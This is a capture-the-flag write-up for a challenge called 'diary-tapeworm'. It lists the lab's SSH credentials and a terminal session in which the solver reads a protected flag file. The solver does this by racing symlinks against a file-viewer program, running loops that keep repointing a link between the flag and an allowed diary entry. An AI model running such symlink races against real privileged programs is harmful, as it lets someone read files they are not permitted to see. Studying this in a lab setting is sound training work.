diary-tapeworm
400
It's pronounced Ker-nel. It's the highest rank in the military.

ssh ctf@ctf.dart.com.sg -p 2302

Password: sheybxzehh

```sh
┌──(razali㉿razali)-[~]
└─$ ssh ctf@192.168.40.199 -p 2302
The authenticity of host '[192.168.40.199]:2302 ([192.168.40.199]:2302)' can't be established.
ECDSA key fingerprint is SHA256:mzSGxnkaYOd3DJsJcnTrK6iuqzawg5Z1hjgcbkY5V2M.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.40.199]:2302' (ECDSA) to the list of known hosts.
ctf@192.168.40.199's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-51-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf@diary-tapeworm:~$ 

ctf@diary-tapeworm:~$ ll
total 28
drwxr-xr-x 1 ctf  ctf  4096 Jul 11 13:52 ./
drwxr-xr-x 1 root root 4096 Jun 29 05:20 ../
-rw-r--r-- 1 ctf  ctf   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 ctf  ctf  3771 Apr  4  2018 .bashrc
drwx------ 2 ctf  ctf  4096 Jul 11 13:52 .cache/
-rw-r--r-- 1 ctf  ctf   807 Apr  4  2018 .profile
ctf@diary-tapeworm:~$ pwd
/home/ctf
ctf@diary-tapeworm:~$ cd ..
ctf@diary-tapeworm:/home$ ll
total 20
drwxr-xr-x 1 root  root  4096 Jun 29 05:20 ./
drwxr-xr-x 1 root  root  4096 Jul 11 13:52 ../
drwxr-xr-x 1 creed creed 4096 Jun 29 05:20 creed/
drwxr-xr-x 1 ctf   ctf   4096 Jul 11 13:52 ctf/
ctf@diary-tapeworm:/home$ cd creed/
ctf@diary-tapeworm:/home/creed$ ll
total 32
drwxr-xr-x 1 creed creed 4096 Jun 29 05:20 ./
drwxr-xr-x 1 root  root  4096 Jun 29 05:20 ../
-rw-r--r-- 1 creed creed  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 creed creed 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 creed creed  807 Apr  4  2018 .profile
drwxrwxrwx 1 creed creed 4096 Jun 29 05:20 diary_entries/
-rwxrwx--- 1 creed creed   29 Jun  1 14:14 flag.txt*
ctf@diary-tapeworm:/home/creed$ cd diary_entries/
ctf@diary-tapeworm:/home/creed/diary_entries$ diaryviewer ../flag
Not cool, man.
ctf@diary-tapeworm:/home/creed/diary_entries$ ln -s ../flag.txt flag.txt
ctf@diary-tapeworm:/home/creed/diary_entries$ diaryviewer flag
Not cool, man.
ctf@diary-tapeworm:/home/creed/diary_entries$ 

ctf@diary-tapeworm:/home/creed/diary_entries$ for i in {1..10000}; do ln -f -s ../flag.txt flag.txt; done &
[4] 41344
ctf@diary-tapeworm:/home/creed/diary_entries$ for i in {1..10000}; do ln -f -s 07082008.txt flag.txt; done &
[5] 45180
ctf@diary-tapeworm:/home/creed/diary_entries$ diaryviewer flag
Not cool, man.
ctf@diary-tapeworm:/home/creed/diary_entries$ diaryviewer flag
Not cool, man.
ctf@diary-tapeworm:/home/creed/diary_entries$ diaryviewer flag
Not cool, man.
ctf@diary-tapeworm:/home/creed/diary_entries$ diaryviewer flag
Path is valid
Not confidential, proceeding to display
/home/creed/diary_entries/flag.txt
Requested diary entry (len=29):
==========
ivyctf{wh0s__y0ur_w0rm_guy??}

```
